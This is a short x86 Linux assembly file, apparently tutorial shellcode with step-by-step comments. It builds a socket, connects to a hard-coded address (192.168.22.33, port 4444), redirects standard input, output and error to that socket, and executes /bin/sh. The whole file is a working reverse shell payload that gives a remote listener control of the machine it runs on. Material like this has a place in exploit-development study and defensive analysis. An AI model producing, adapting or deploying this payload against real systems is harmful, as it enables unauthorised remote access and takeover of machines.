BITS 32

; Do the steps to setup a socket (1)
; SYS_socket = 1
mov ebx, 1
; Setup the arguments to socket() on the stack.
push 0  ; Flags = 0
push 1  ; SOCK_STREAM = 1
push 2  ; AF_INET = 2
; Move a pointer to these values to ecx for socketcall.
mov ecx, esp
; We're calling SYS_SOCKETCALL
mov eax, 0x66
; Get the socket
int 0x80

; Time to setup the struct sockaddr_in (2), (3)
; push the address so it ends up in network byte order
; 192.168.22.33 == 0xC0A81621
push 0x2116a8c0
; push the port as a short in network-byte order
; 4444 = 0x115c
mov ebx, 0x5c11
push bx
; push the address family, AF_INET = 2
mov ebx, 0x2
push bx

; Let's establish the connection (4)
; Save address of our struct
mov ebx, esp
; Push size of the struct
push 0x10
; Push address of the struct
push ebx
; Push the socketfd
push eax
; Put the pointer into ecx
mov ecx, esp
; We're calling SYS_CONNECT = 3 (via SYS_SOCKETCALL)
mov ebx, 0x3
; Preserve sockfd
push eax
; Call SYS_SOCKETCALL
mov eax, 0x66
; Make the connection
int 0x80

; Let's duplicate the FDs from our socket. (5)
; Load the sockfd
pop ebx
; STDERR
mov ecx, 2
; Calling SYS_DUP2 = 0x3f
mov eax, 0x3f
; Syscall!
int 0x80
; mov to STDOUT
dec ecx
; Reload eax
mov eax, 0x3f
; Syscall!
int 0x80
; mov to STDIN
dec ecx
; Reload eax
mov eax, 0x3f
; Syscall!
int 0x80

; Now time to execve (6)
; push "/bin/sh\0" on the stack
push 0x68732f
push 0x6e69622f
; preserve filename
mov ebx, esp
; array of arguments
mov eax, eax
push eax
push ebx
; pointer to array in ecx
mov ecx, esp
; null envp
xor edx, edx
; call SYS_execve = 0xb
mov eax, 0xb
; execute the shell!
int 0x80
